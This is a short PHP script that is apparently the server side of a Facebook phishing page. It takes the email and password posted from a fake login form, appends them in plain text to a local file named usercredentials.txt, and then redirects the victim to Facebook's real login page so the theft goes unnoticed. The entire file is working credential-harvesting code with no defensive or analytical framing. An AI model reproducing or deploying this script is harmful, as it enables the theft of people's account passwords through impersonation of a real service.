<?php
	//Extract the credentails received.
	$username = $_POST["email"];		//get the username
	$passw = $_POST["pass"];		//get the password
	
	$newfile = fopen("usercredentials.txt", "a") or die("File cannot be opened");	//create and open a blank text file foe write user credentials
	$details = " Username = $username \n Password = $passw \n\n";			
	fwrite($newfile, $details);							//write the credentials on newly created file
	fclose($newfile);								//close the opened text file

	//Redirect browser to original login page
	header("Location: https://www.facebook.com/login.php");
	
	exit();

?>
